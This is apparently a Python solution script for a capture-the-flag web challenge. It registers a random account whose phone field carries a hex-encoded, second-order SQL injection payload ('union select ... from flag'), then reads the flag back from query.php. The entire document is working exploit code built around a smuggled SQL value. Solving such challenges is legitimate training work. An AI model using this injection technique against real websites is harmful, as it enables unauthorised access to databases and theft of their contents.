import codecs
import requests
import uuid


def bin2hex(se: str):
    return codecs.encode(se.encode(), 'hex').decode()


url = 'http://5da922689f4b491b9650fbb2f758fed19a9ca612ff304182.game.ichunqiu.com'

data = {
    'username': str(uuid.uuid4()).replace('-', ''),
    'password': 'hello'
}

phones = "1' union select (select * from flag) order by 1 desc#"

data['phone'] = '0x' + bin2hex(phones)
s = requests.session()
s.post(url + '/register.php', data=data)
print('[+] Register Finish')
print(s.get(url + '/query.php').content.decode())
